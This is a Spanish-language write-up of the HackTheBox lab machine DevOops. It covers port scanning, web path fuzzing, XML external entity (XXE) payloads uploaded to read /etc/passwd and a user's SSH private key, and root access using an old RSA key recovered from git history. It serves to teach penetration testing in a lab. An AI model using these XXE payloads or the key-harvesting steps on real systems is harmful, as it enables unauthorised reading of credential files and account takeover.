---
layout      : post
title       : "DevOops - HackTheBox"
author      : elc4br4
image       : assets/images/HTB/DevOops-HackTheBox/DevOops.webp
category    : [ htb ]
tags        : [ Linux ]
---

Estamos ante una máquina Linux de nivel MEDIUM en la que explotaremos la vulnerabilidad XXE para leer archivos generando un archivo .xml y escalaremos privilegios a través de un rsa.

![](/assets/images/HTB/DevOops-HackTheBox/DevOops2.webp)

[![HTBadge](https://www.hackthebox.eu/badge/image/533771)](https://www.hackthebox.com/home/users/profile/533771)

![](/assets/images/HTB/DevOops-HackTheBox/DevOops-rating.webp)

...


**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
    * [Reconocimiento de Puertos](#recon-nmap).
2. [Enumeración](#enumeración).
    * [Enumeración Web](#enum-web).
3. [Explotación](#explotacion).   
    * [Burpsuite](#burpsuite).
 5. [Escalada de Privilegios](#privesc). 
    * [Git](#git).   


...

# Reconocimiento [#](reconocimiento) {#reconocimiento}

----

## Reconocimiento de Puertos [📌](#recon-nmap) {#recon-nmap}

Para comenzar lanzo la herramienta WhichSystem para identificar ante que sistema operativo nos enfrentamos.

![](/assets/images/HTB/DevOops-HackTheBox/WhichSystem.webp)

Ya se que estamos ante una máquina Linux, asique a continuación escanearé los puertos existentes en la máquina.

```nmap
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```
Tenemos el puerto 22(ssh) y el puerto 5000 (upnp).

Pero necesito más información del puerto 5000 asique escanearé los puertos de forma más avanzada.

```nmap
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ahora ya tenemos algo más de información, asique procedo a enumerar el servidor web.

# Enumeración [#](enumeración) {#enumeración}

----

## Enumeración Web [📌](#enum-web) {#enum-web}

Accedo desde el navegador al servidor web.

![](/assets/images/HTB/DevOops-HackTheBox/web1.webp)

Parece que el sitio está en desarrollo, pero no hay nada interesante, asique voy a fuzzear rutas.

Usaré la herramienta wfuzz para enumerar rutas en el servidor web.

`wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.91:5000/FUZZ --hl=4`

![](/assets/images/HTB/DevOops-HackTheBox/wfuzz.webp)

* upload
* feed

En la ruta feed no hay nada que pueda servirme.

Pero en la ruta upload hay un panel de subida de archivos

![](/assets/images/HTB/DevOops-HackTheBox/web2.webp)

# Explotación [#](explotacion) {#explotacion}

----

## Burpsuite [🔥](#burpsuite) {#burpsuite}

Pruebo a subir una reverse shell en php y capturar la petición con Burpsuite.

![](/assets/images/HTB/DevOops-HackTheBox/revphp.webp)

Pero no ocurre nada, aunque si nos fijamos en el servidor web veremos esto.

> `XML elements: Author, Subject, Content`

Debemos subir un archivo XML que contenga los campos Author, Subject y Content.

Si hablamos de XML... se me ocurre XXE, asique buscaré información sobre la vulnerabilidad XXE.

Buscando encuentro información en la web de OWASP.

[https://owasp.org/www-community/vulnerabilities](https://owasp.org/www-community/vulnerabilities)

![](/assets/images/HTB/DevOops-HackTheBox/XXE.webp)

La sintaxis del archivo será la siguiente,añadiremos los campos Author, Subject y añadiremos el campo Content.


```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds>
  <Author>&xxe;</Author>
  <Subject>mysub</Subject>
  <Content>mycontent</Content>
</creds>
```

Subimos el archivo y capturamos la petición con Burp.

Enviamos la petición al Repeater y la enviamos haciendo click en send.

![](/assets/images/HTB/DevOops-HackTheBox/Burp1.webp)

Y como vemos tenemos el archivo passwd para leer.

Encuentro varios usuarios

```users
git:x:1001:1001:git,,,:/home/git:/bin/bash
roosa:x:1002:1002:,,,:/home/roosa:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
blogfeed:x:1003:1003:,,,:/home/blogfeed:/bin/false
```
El más destacable es _roosa_, asique igual que he leido el archivo passwd intento leer el archivo id_rsa del usuario roosa para poder conectarme por ssh.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id-rsa" >]>
<creds>
  <Author>&xxe;</Author>
  <Subject>mysub</Subject>
  <Content>mycontent</Content>
</creds>
```

![](/assets/images/HTB/DevOops-HackTheBox/Burp2.webp)

Y ahí lo tenemos, asique me lo copio a un archivo y le asigno los permisos 400 con `chmod 400 id_rsa`.

Una vez hecho, me conecto por ssh.

![](/assets/images/HTB/DevOops-HackTheBox/ssh.webp)

Y ya podemos leer la flag user.txt


# Escalada de Privilegios [#](privesc) {#privesc}

----

## Git[👽](git) {#git}

Ahora toca escalar privilegios para leer la flag root, pero para eso debemos convertirnos en el usuario root.

Enumerando encuentro carpeta .git en la ruta /home/roosa/work/blogfeed/.git asique pruebo con el comando `git log -r` a ver que obtenemos. 

![](/assets/images/HTB/DevOops-HackTheBox/git.webp)

> reverted accidental commit with proper key

Dato curioso que decido mirar, asique si ejecuto `git log -p 6`...

![](/assets/images/HTB/DevOops-HackTheBox/git2.webp)

Tenemos dos claves rsa, una en rojo y la otra en verde, creo que debido a un error revirtieron las claves rsa, por lo tanto la roja es la clave antigua asique pruebo a copiarla y usarla para conectarme por ssh como root.

![](/assets/images/HTB/DevOops-HackTheBox/rsa.webp)

Una vez lo tenemos copiado en un archivo le asigamos los permisos 600 con `chmod 600 id_rsa2` y nos logueamos por ssh como root.

![](/assets/images/HTB/DevOops-HackTheBox/root.webp)

👨🏻‍💻Y ya hemos pwneado la máquina DevOops👨🏻‍💻

![](/assets/images/HTB/DevOops-HackTheBox/gif.gif)